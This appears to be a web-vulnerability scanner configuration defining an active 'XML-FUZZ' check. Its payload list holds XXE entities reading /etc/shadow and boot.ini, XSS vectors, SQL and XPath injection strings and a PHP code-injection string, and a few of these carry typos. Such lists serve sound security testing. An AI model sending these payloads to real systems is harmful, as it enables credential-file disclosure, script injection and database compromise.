[{"Name":"XML-FUZZ","Active":true,"Scanner":1,"Payloads":["<![CDATA[<script>var n=0;while(true){n++;}</script>]]>","<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\u0027gotcha\u0027);<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>","<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[\u0027 or 1=1 or \u0027\u0027=\u0027]]></foof>","<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file://c:/boot.ini\">]><foo>\u0026xee;</foo>","<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/resolv.conf\">]><foo>\u0026xee;</foo>","<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>\u0026xee;</foo>","<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>\u0026xee;</foo>","<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM \"file:///c:/boot.ini\">","]>","<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM \"file:///etc/resolv.conf\">","]>","\"<xml ID=I><X><C><![CDATA[<IMG SRC=\"\"javas]]><![CDATA[cript:alert(\u0027XSS\u0027);\"\">]]>\"","\"<xml ID=\"\"xss\"\"><I><B><IMG SRC=\"\"javas<!-- -->cript:alert(\u0027XSS\u0027)\"\"></B></I></xml><SPAN DATASRC=\"\"#xss\"\" DATAFLD=\"\"B\"\" DATAFORMATAS=\"\"HTML\"\"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\"","\"<xml SRC=\"\"xsstest.xml\"\" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\"","\"<HTML xmlns:xss><?import namespace=\"\"xss\"\" implementation=\"\"http://example.com/xss.htc\"\"><xss:xss>XSS</xss:xss></HTML>\"","<name>\u0027,\u0027\u0027)); phpinfo(); exit;/*</name>","## Element and Attrib Values","null","*","%","@","$","-","+",";",":","0","-1","1","0.1","0.9","true","false","1.7976931348623157e+308","5e-324","0.00005","5e-10","\u0026apos;XoiZR","\u0026quot;XoiZR","\u0026lt;Tnn96\u0026gt;","\u0026lt;?Tnn96 ?\u0026gt;","\u0026lt;? Tnn96 ?\u0026gt;","\u0026lt;% Tnn96 %\u0026gt;","\u0026lt;%= Tnn96 %\u0026gt;","[Tnn96]","(Tnn96)","{Tnn96}","{{Tnn96}}","{= Tnn96}","{{= Tnn96}}","\u0027 or \u00271\u0027=\u00271","\u0027 or \u0027\u0027=\u0027","x\u0027 or 1=1 or \u0027x\u0027=\u0027y","/","//","//*","*/*","@*","count(/child::node())","x\u0027 or name()=\u0027username\u0027 or \u0027x\u0027=\u0027y"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","SearchString":"","ReplaceString":"","Grep":["error"],"PayloadResponse":false,"NotResponse":false,"NotCookie":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","IsResponseCode":false,"ResponseCode":"","MatchType":1,"IssueName":"XML-FUZZ","IssueSeverity":"Information","IssueConfidence":"Certain","IssueDetail":"XML-FUZZ\n\n\u003cgrep\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":""}]